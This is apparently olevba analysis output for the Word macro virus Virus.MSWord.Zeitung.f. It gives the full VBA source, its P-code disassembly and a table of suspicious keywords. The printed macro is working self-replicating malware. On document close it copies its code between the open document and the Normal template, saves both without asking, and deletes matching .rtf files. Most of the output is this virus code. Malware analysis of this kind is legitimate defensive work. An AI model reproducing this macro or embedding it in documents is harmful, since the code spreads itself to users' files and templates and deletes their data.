olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zeitung.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zeitung.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Const Signature = "VirusZeitung"
'èó îäíÐììÄàîû ë åòèàè àåû"äêéîîüâðññçà îàî èâìäíéðçöèãçò Àñè ã"
'60
'awedft
Dim sd, reg As Boolean
Private Function Kontaminat(O)
 If Not O.codemodule.Find(Signature, 1, 1, 100, 100) Then
  Kontaminat = 0
 Else
  If O.codemodule.countoflines < 50 Then
   Kontaminat = 0
  Else
   Ant$ = Trim(O.codemodule.lines(3, 1))
   Ant$ = Trim(Mid(Ant$, 2, Len(Ant$) - 1))
   If Val(Ant$) < 65535 Then
    Kontaminat = Val(Ant$)
   Else
    Kontaminat = -1
   End If
 End If
 End If
End Function
Private Sub Document_Close()
 Dim ad, nt As Object
 Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
 Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
 On Error Resume Next
 Options.VirusProtection = True
 If (Kontaminat(ad) < Kontaminat(nt)) And ((ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate)) Then
  sd = ActiveDocument.Saved
  cofl = ad.codemodule.countoflines
  ad.codemodule.deletelines 1, cofl
  For v = 1 To nt.codemodule.countoflines
   If Trim(nt.codemodule.lines(v, 1)) <> "" Then
    ad.codemodule.insertlines v, nt.codemodule.lines(v, 1)
   End If
  Next v
  If (sd = True) And (Mid(ActiveDocument.ActiveWindow.Caption, 1, 8) <> "Äîêóìåíò") Then ActiveDocument.Save
 End If
 If Kontaminat(ad) > Kontaminat(nt) Then
  sd = NormalTemplate.Saved
  cofl = nt.codemodule.countoflines
  nt.codemodule.deletelines 1, cofl
  For v = 1 To ad.codemodule.countoflines
   If Trim(ad.codemodule.lines(v, 1)) <> "" Then
    nt.codemodule.insertlines v, ad.codemodule.lines(v, 1)
   End If
  Next v
  If sd = True Then NormalTemplate.Save
 End If
 Set nt = Nothing
 Set ad = Nothing
 Kill "Àäñêèé*.rtf"
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Zeitung.f
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 7950 bytes
' Line #0:
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x000C "VirusZeitung"
' 	VarDefn Signature
' Line #2:
' 	QuoteRem 0x0000 0x003F "èó îäíÐììÄàîû ë åòèàè àåû"äêéîîüâðññçà îàî èâìäíéðçöèãçò Àñè ã""
' Line #3:
' 	QuoteRem 0x0000 0x0002 "60"
' Line #4:
' 	QuoteRem 0x0000 0x0006 "awedft"
' Line #5:
' 	Dim 
' 	VarDefn sd
' 	VarDefn reg (As Boolean)
' Line #6:
' 	FuncDefn (Private Function Kontaminat(O, id_FFFE As Variant))
' Line #7:
' 	Ld Signature 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	LitDI2 0x0064 
' 	Ld O 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	IfBlock 
' Line #8:
' 	LitDI2 0x0000 
' 	St Kontaminat 
' Line #9:
' 	ElseBlock 
' Line #10:
' 	Ld O 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	LitDI2 0x0032 
' 	Lt 
' 	IfBlock 
' Line #11:
' 	LitDI2 0x0000 
' 	St Kontaminat 
' Line #12:
' 	ElseBlock 
' Line #13:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld O 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	St Ant$ 
' Line #14:
' 	Ld Ant$ 
' 	LitDI2 0x0002 
' 	Ld Ant$ 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Trim 0x0001 
' 	St Ant$ 
' Line #15:
' 	Ld Ant$ 
' 	ArgsLd Val 0x0001 
' 	LitDI4 0xFFFF 0x0000 
' 	Lt 
' 	IfBlock 
' Line #16:
' 	Ld Ant$ 
' 	ArgsLd Val 0x0001 
' 	St Kontaminat 
' Line #17:
' 	ElseBlock 
' Line #18:
' 	LitDI2 0x0001 
' 	UMi 
' 	St Kontaminat 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	EndFunc 
' Line #23:
' 	FuncDefn (Private Sub Document_Close())
' Line #24:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #25:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #26:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #29:
' 	Ld ad 
' 	ArgsLd Kontaminat 0x0001 
' 	Ld nt 
' 	ArgsLd Kontaminat 0x0001 
' 	Lt 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Paren 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #30:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St sd 
' Line #31:
' 	Ld ad 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St cofl 
' Line #32:
' 	LitDI2 0x0001 
' 	Ld cofl 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0002 
' Line #33:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	For 
' Line #34:
' 	Ld v 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #35:
' 	Ld v 
' 	Ld v 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemCall insertlines 0x0002 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	NextVar 
' Line #38:
' 	Ld sd 
' 	LitVarSpecial (True)
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd ActiveWindow 
' 	MemLd Caption 
' 	LitDI2 0x0001 
' 	LitDI2 0x0008 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0008 "Äîêóìåíò"
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	Ld ad 
' 	ArgsLd Kontaminat 0x0001 
' 	Ld nt 
' 	ArgsLd Kontaminat 0x0001 
' 	Gt 
' 	IfBlock 
' Line #41:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St sd 
' Line #42:
' 	Ld nt 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St cofl 
' Line #43:
' 	LitDI2 0x0001 
' 	Ld cofl 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0002 
' Line #44:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	For 
' Line #45:
' 	Ld v 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #46:
' 	Ld v 
' 	Ld v 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemCall insertlines 0x0002 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	NextVar 
' Line #49:
' 	Ld sd 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	SetStmt 
' 	LitNothing 
' 	Set nt 
' Line #52:
' 	SetStmt 
' 	LitNothing 
' 	Set ad 
' Line #53:
' 	LitStr 0x000B "Àäñêèé*.rtf"
' 	ArgsCall Kill 0x0001 
' Line #54:
' 	EndSub 
' Line #55:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

